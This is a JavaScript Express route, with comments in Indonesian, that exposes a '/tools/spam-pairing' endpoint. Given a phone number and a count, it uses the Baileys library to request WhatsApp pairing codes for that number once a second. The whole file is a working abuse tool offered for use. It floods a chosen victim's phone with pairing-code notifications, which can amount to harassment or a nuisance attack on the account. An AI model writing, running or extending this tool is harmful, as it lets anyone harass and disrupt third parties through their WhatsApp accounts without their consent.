const {
    makeWASocket,
    useSingleFileAuthState,
    makeCacheableSignalKeyStore,
} = require("baileys");
const Pino = require("pino");

let sessionCache = {}; // Cache untuk menyimpan sesi di memory

function no(number) {
    return number.replace(/\D/g, "").replace(/^0/, "62");
}

module.exports = (app) => {
    app.get("/tools/spam-pairing", async (req, res) => {
        let { number, count } = req.query;

        if (!number) {
            return res.status(400).json({ error: "❌ Harap masukkan nomor yang valid!" });
        }

        let target = no(number);
        let jumlah = parseInt(count) || 20;

        // Cek apakah sesi sudah ada di memory
        if (!sessionCache[target]) {
            console.log("> 🔍 Sesi tidak ditemukan, membuat sesi baru...");

            // Gunakan useSingleFileAuthState() dengan penyimpanan langsung di memory
            const { state } = await useSingleFileAuthState();
            sessionCache[target] = state;
        } else {
            console.log("> 🔄 Menggunakan sesi yang sudah ada di memory...");
        }

        const config = {
            logger: Pino({ level: "fatal" }).child({ level: "fatal" }),
            printQRInTerminal: false,
            mobile: false,
            auth: {
                creds: sessionCache[target].creds,
                keys: makeCacheableSignalKeyStore(sessionCache[target].keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            browser: ["Ubuntu", "Edge", "110.0.1587.56"],
            markOnlineOnConnect: true,
        };

        let sock = makeWASocket(config);

        console.log("> ✅ Koneksi berhasil!");

        setTimeout(async () => {
            for (let i = 0; i < jumlah; i++) {
                try {
                    let retries = i + 1;
                    let pairing = await sock.requestPairingCode(target);
                    let code = pairing?.match(/.{1,4}/g)?.join("-") || pairing;

                    console.log(`> 🔄 [${retries}/${jumlah}] 😛 Kode pairing: ${code}`);
                } catch (err) {
                    console.log(`> ❌ Gagal mendapatkan pairing code: ${err.message}`);
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }, 3000);

        return res.json({ status: true, result: { message: "✅ Proses pairing dimulai!", target, jumlah } });
    });
};